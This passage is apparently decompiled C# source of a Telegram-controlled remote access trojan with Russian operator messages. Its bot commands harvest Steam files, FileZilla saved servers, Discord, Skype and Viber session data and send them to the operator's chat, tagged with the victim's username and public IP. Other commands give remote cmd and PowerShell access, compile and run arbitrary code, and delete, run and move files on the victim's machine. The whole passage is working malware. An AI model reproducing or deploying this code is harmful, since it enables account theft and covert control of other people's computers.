							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Steam.zip", content), 0, null);
							System.IO.File.Delete(Folders.hidenfolder + "\\Steam.zip");
							Directory.Delete(Folders.hidenfolder + "\\Steam", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Лога нет)", false, 0, null, false);
							if (Directory.Exists(Folders.hidenfolder + "\\Steam"))
							{
								System.IO.File.Delete(Folders.hidenfolder + "\\Steam.zip");
								Directory.Delete(Folders.hidenfolder + "\\Steam", true);
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser41.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetSteamFiles", false, 0, null, false);
				};
				list43.Add(firstParser41);
				List<FirstParser> list44 = Commands.grab;
				FirstParser firstParser42 = new FirstParser();
				firstParser42.Command = "/GetFileZillaConfig";
				firstParser42.CountArgs = 0;
				firstParser42.Example = "/GetFileZillaConfig";
				firstParser42.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string pathtofilezilla = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						if (System.IO.File.Exists(pathtofilezilla))
						{
							FileStream content = System.IO.File.OpenRead(pathtofilezilla);
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("FileZilla.xml", content), 0, null);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Возможно у юзера нет FileZill'ы)", false, 0, null, false);
						}
						pathtofilezilla = null;
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser42.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetFileZillaConfig", false, 0, null, false);
				};
				list44.Add(firstParser42);
				List<FirstParser> list45 = Commands.grab;
				FirstParser firstParser43 = new FirstParser();
				firstParser43.Command = "/GetDiscordSession";
				firstParser43.CountArgs = 0;
				firstParser43.Example = "/GetDiscordSession";
				firstParser43.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						CopyDiscordSession.GetDiscordSession("*.*", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord\\Local Storage\\leveldb") ?? "", Folders.hidenfolder + "\\DSession", true).Wait();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						if (System.IO.File.Exists(Folders.hidenfolder + "\\Discord.zip"))
						{
							FileStream content = System.IO.File.OpenRead(Folders.hidenfolder + "\\Discord.zip");
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Discord.zip", content), 0, null);
							System.IO.File.Delete(Folders.hidenfolder + "\\Discord.zip");
							Directory.Delete(Folders.hidenfolder + "\\DSession", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Лога нет)", false, 0, null, false);
							if (Directory.Exists(Folders.hidenfolder + "\\DSession"))
							{
								System.IO.File.Delete(Folders.hidenfolder + "\\Discord.zip");
								Directory.Delete(Folders.hidenfolder + "\\DSession", true);
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser43.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetDiscordSession", false, 0, null, false);
				};
				list45.Add(firstParser43);
				List<FirstParser> list46 = Commands.grab;
				FirstParser firstParser44 = new FirstParser();
				firstParser44.Command = "/GetSkypeSession";
				firstParser44.CountArgs = 0;
				firstParser44.Example = "/GetSkypeSession";
				firstParser44.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						Archive.Zip(Folders.hidenfolder + "\\Skype.zip", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Skype")).Wait();
						if (System.IO.File.Exists(Folders.hidenfolder + "\\Skype.zip"))
						{
							FileStream content = System.IO.File.OpenRead(Folders.hidenfolder + "\\Skype.zip");
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Skype.zip", content), 0, null);
							System.IO.File.Delete(Folders.hidenfolder + "\\Skype.zip");
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Лога нет)", false, 0, null, false);
							if (System.IO.File.Exists(Folders.hidenfolder + "\\Skype.zip"))
							{
								System.IO.File.Delete(Folders.hidenfolder + "\\Skype.zip");
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser44.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetSkypeSession", false, 0, null, false);
				};
				list46.Add(firstParser44);
				List<FirstParser> list47 = Commands.grab;
				FirstParser firstParser45 = new FirstParser();
				firstParser45.Command = "/GetViberSession";
				firstParser45.CountArgs = 0;
				firstParser45.Example = "/GetViberSession";
				firstParser45.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						CopyViberSession.GetFilesSession("*.*", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ViberPC") ?? "", Folders.hidenfolder + "\\VSession", true).Wait();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						if (System.IO.File.Exists(Folders.hidenfolder + "\\Viber.zip"))
						{
							FileStream content = System.IO.File.OpenRead(Folders.hidenfolder + "\\Viber.zip");
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Viber.zip", content), 0, null);
							System.IO.File.Delete(Folders.hidenfolder + "\\\\Viber.zip");
							Directory.Delete(Folders.hidenfolder + "\\VSession", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Лога нет)", false, 0, null, false);
							if (Directory.Exists(Folders.hidenfolder + "\\VSession"))
							{
								System.IO.File.Delete(Folders.hidenfolder + "\\Viber.zip");
								Directory.Delete(Folders.hidenfolder + "\\VSession", true);
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser45.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetViberSession", false, 0, null, false);
				};
				list47.Add(firstParser45);
				List<SecondParser> list48 = Commands.cmd;
				SecondParser secondParser3 = new SecondParser();
				secondParser3.Command = "/help";
				secondParser3.Example = "/help";
				secondParser3.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПолный доступ к Cmd\n/help для просмотра списка команд\nНапиши /timeout и рядом укажи нужный тебе таймаут в миллисекундах\nПо дефолту таймаут 7 секунд (＠＾－＾) \nЧтобы вернуться напишите /back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list48.Add(secondParser3);
				List<SecondParser> list49 = Commands.cmd;
				SecondParser secondParser4 = new SecondParser();
				secondParser4.Command = "/timeout";
				secondParser4.Example = "/timeout [7000]";
				secondParser4.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						Cmd.timeout = Convert.ToInt32(smodel.Arg);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТаймаут установлен", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list49.Add(secondParser4);
				List<SecondParser> list50 = Commands.powershell;
				SecondParser secondParser5 = new SecondParser();
				secondParser5.Command = "/help";
				secondParser5.Example = "/help";
				secondParser5.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПолный доступ к PowerShell \n/help для просмотра списка команд\nНапиши /timeout и рядом укажи нужный тебе таймаут в миллисекундах\nПо дефолту таймаут 7 секунд (*⌒―⌒*)))\nЧтобы вернуться напишите /back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list50.Add(secondParser5);
				List<SecondParser> list51 = Commands.powershell;
				SecondParser secondParser6 = new SecondParser();
				secondParser6.Command = "/timeout";
				secondParser6.Example = "/timeout [7000]";
				secondParser6.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						PowerShell.timeout = Convert.ToInt32(smodel.Arg);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТаймаут установлен", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list51.Add(secondParser6);
				List<SecondParser> list52 = Commands.simplecomp;
				SecondParser secondParser7 = new SecondParser();
				secondParser7.Command = "!run";
				secondParser7.Example = "!run";
				secondParser7.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string program = SharpCompiller.FormatSources(SharpCompiller.code);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						if (!SharpCompiller.GenerateScript(program))
						{
							string errors = string.Join("", SharpCompiller.error);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВ коде обнаружены ошибки : ¯\\(°_o)/¯", false, 0, null, false);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								errors.ToString()
							}), false, 0, null, false);
							SharpCompiller.error = new List<string>();
							errors = null;
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nКод скомпилирован и запущен\n(/-_・)/D・・・・・------ → (Юзверь)", false, 0, null, false);
						}
						program = null;
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list52.Add(secondParser7);
				List<SecondParser> list53 = Commands.simplecomp;
				SecondParser secondParser8 = new SecondParser();
				secondParser8.Command = "!show";
				secondParser8.Example = "!show";
				secondParser8.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							SharpCompiller.FormatSources(SharpCompiller.code)
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list53.Add(secondParser8);
				List<SecondParser> list54 = Commands.simplecomp;
				SecondParser secondParser9 = new SecondParser();
				secondParser9.Command = "!del";
				secondParser9.Example = "!del";
				secondParser9.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						SharpCompiller.code.RemoveAt(SharpCompiller.code.Count - 1);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							SharpCompiller.FormatSources(SharpCompiller.code)
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list54.Add(secondParser9);
				List<SecondParser> list55 = Commands.simplecomp;
				SecondParser secondParser10 = new SecondParser();
				secondParser10.Command = "!clear";
				secondParser10.Example = "!clear";
				secondParser10.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						SharpCompiller.code = new List<string>();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							SharpCompiller.FormatSources(SharpCompiller.code)
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list55.Add(secondParser10);
				List<SecondParser> list56 = Commands.filemanager;
				SecondParser secondParser11 = new SecondParser();
				secondParser11.Command = "cd";
				secondParser11.Example = "cd [directory]";
				secondParser11.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						if (smodel.Arg == "..")
						{
							Commands.cd.RemoveAt(Commands.cd.Count - 1);
							if (string.IsNullOrEmpty(string.Join("", Commands.cd)))
							{
								ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
								{
									Keyboard = new string[][]
									{
										new string[]
										{
											"/help"
										},
										new string[]
										{
											"drives"
										},
										new string[]
										{
											"/exit"
										}
									}
								};
								Program.cdpath = null;
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыбирите диск", false, 0, replyMarkup, false);
							}
							else
							{
								Program.cdpath = Commands.cd.Last<string>().Replace("\n", null);
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
								{
									Environment.UserName,
									"/",
									Commands.pubIp,
									"\n",
									Program.cdpath
								}), false, 0, null, false);
							}
						}
						else if (Directory.Exists(Program.cdpath + smodel.Arg + "//"))
						{
							ReplyKeyboardMarkup replyMarkup2 = new ReplyKeyboardMarkup
							{
								Keyboard = new string[][]
								{
									new string[]
									{
										"/help"
									},
									new string[]
									{
										"ls"
									},
									new string[]
									{
										"back"
									},
									new string[]
									{
										"/exit"
									}
								}
							};
							Program.cdpath = Program.cdpath + smodel.Arg + "//";
							Commands.cd.Add(Program.cdpath + "\n");
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\nPath:  ",
								Program.cdpath.ToString()
							}), false, 0, replyMarkup2, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТакой дериктории не существует", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list56.Add(secondParser11);
				List<SecondParser> list57 = Commands.filemanager;
				SecondParser secondParser12 = new SecondParser();
				secondParser12.Command = "back";
				secondParser12.Example = "back";
				secondParser12.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						Commands.cd.RemoveAt(Commands.cd.Count - 1);
						if (string.IsNullOrEmpty(string.Join("", Commands.cd)))
						{
							ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
							{
								Keyboard = new string[][]
								{
									new string[]
									{
										"/help"
									},
									new string[]
									{
										"drives"
									},
									new string[]
									{
										"/exit"
									}
								}
							};
							Program.cdpath = null;
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыбирите диск", false, 0, replyMarkup, false);
						}
						else
						{
							Program.cdpath = Commands.cd.Last<string>().Replace("\n", null);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\n",
								Program.cdpath
							}), false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list57.Add(secondParser12);
				List<SecondParser> list58 = Commands.filemanager;
				SecondParser secondParser13 = new SecondParser();
				secondParser13.Command = "ls";
				secondParser13.Example = "ls";
				secondParser13.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						if (!string.IsNullOrEmpty(Program.cdpath))
						{
							string[] files = Directory.GetFiles(Program.cdpath.ToString());
							DirectoryInfo directoryInfo = new DirectoryInfo(Program.cdpath.ToString());
							List<string> file = new List<string>();
							foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
							{
								file.Add("\nПапка:  " + directoryInfo2.Name + "\n");
							}
							for (int j = 0; j < files.Length; j++)
							{
								string str = files[j].Replace(Program.cdpath.ToString(), "");
								file.Add("\nФайл:  " + str + "\n");
							}
							string text = string.Join(" ", file);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\nСодержимое\n",
								Program.cdpath,
								":\n",
								text
							}), false, 0, null, false);
							file.Clear();
							file = null;
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСначала нужно перейти в любую директорию", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					int i = num;
					object obj;
					if (i == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list58.Add(secondParser13);
				List<SecondParser> list59 = Commands.filemanager;
				SecondParser secondParser14 = new SecondParser();
				secondParser14.Command = "delete";
				secondParser14.Example = "delete [NameFileInFolder]";
				secondParser14.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (System.IO.File.Exists(path))
						{
							System.IO.File.Delete(path);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nОтветь на один вопрос\nЗа что? (>_<) ", false, 0, null, false);
							Thread.Sleep(2000);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУже удалил ︶︿︶", false, 0, null, false);
						}
						else if (Directory.Exists(path))
						{
							Directory.Delete(path, true);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЦелую папку, изверг?", false, 0, null, false);
							Thread.Sleep(2000);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПридёться удалять (\u3000￣д￣)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанного предмета не существует (￣_￣)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list59.Add(secondParser14);
				List<SecondParser> list60 = Commands.filemanager;
				SecondParser secondParser15 = new SecondParser();
				secondParser15.Command = "drives";
				secondParser15.Example = "drives";
				secondParser15.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string drives = Func.Drives;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nЧекай:\n",
							drives
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list60.Add(secondParser15);
				List<SecondParser> list61 = Commands.filemanager;
				SecondParser secondParser16 = new SecondParser();
				secondParser16.Command = "run";
				secondParser16.Example = "run [NameFileInFolder]";
				secondParser16.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (System.IO.File.Exists(path))
						{
							Func.Run(path);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (￢‿￢ )", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанный файл не существует (－‸ლ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list61.Add(secondParser16);
				List<SecondParser> list62 = Commands.filemanager;
				SecondParser secondParser17 = new SecondParser();
				secondParser17.Command = "mkdir";
				secondParser17.Example = "mkdir [NameFileInFolder]";
				secondParser17.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string path = Program.cdpath + smodel.Arg;
						if (Directory.Exists(path))
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nДанная папка уже существует (O.O)", false, 0, null, false);
						}
						else
						{
							Directory.CreateDirectory(path);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\nЯ создал папку ",
								smodel.Arg
							}), false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list62.Add(secondParser17);
				List<SecondParser> list63 = Commands.filemanager;
				SecondParser secondParser18 = new SecondParser();
				secondParser18.Command = "remove";
				secondParser18.Example = "remove [NameFileInFolder],[AnotherDirectory]";
				secondParser18.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string[] array = smodel.Arg.Split(new char[]
						{
							','
						});
						string text = (array != null) ? array.First<string>() : null;
						string folder = ((array != null) ? array.Last<string>() : null) + "\\" + text;
						if (Func.Remove(Program.cdpath + text, folder))
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (･ω<)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУказанного предмета не существует ( ￣ー￣)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list63.Add(secondParser18);
				List<SecondParser> list64 = Commands.filemanager;
				SecondParser secondParser19 = new SecondParser();
				secondParser19.Command = "rename";
				secondParser19.Example = "rename [NameFileInFolder],[NewName]";
				secondParser19.Execute = async delegate(SecondModel smodel, Update update)
				{
					int num = 0;
					try
					{
						string[] array = smodel.Arg.Split(new char[]
						{
							','
						});
						string str = (array != null) ? array.First<string>() : null;
						string str2 = (array != null) ? array.Last<string>() : null;
						if (Func.Remove(Program.cdpath + str, Program.cdpath + str2))
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_<)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТакого файла или дериктории не существует (－‸ლ)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
